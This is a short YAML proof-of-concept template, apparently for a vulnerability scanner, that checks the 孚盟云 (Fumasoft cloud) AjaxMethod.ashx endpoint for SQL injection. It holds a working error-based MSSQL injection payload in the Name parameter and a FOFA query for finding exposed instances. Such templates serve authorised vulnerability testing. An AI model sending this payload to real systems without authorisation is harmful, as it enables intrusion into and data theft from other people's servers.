id: poc-yaml-fumasoft-ajaxmethod-ashx-sqli
info:
  name: 孚盟云 AjaxMethod.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 孚盟云
  fofa: app="孚盟软件-孚盟云"
variables:
  t1: random_int(100,1000)
  t2: md5(t1)
requests:
- method: GET
  path: /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=1'+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--+
  expression: status_code == 500 && contains(body,t2) && matches(body,"转换成数据类型(.*?)时失败")
    && matches(body,"在将(.*?)值")
transport: http
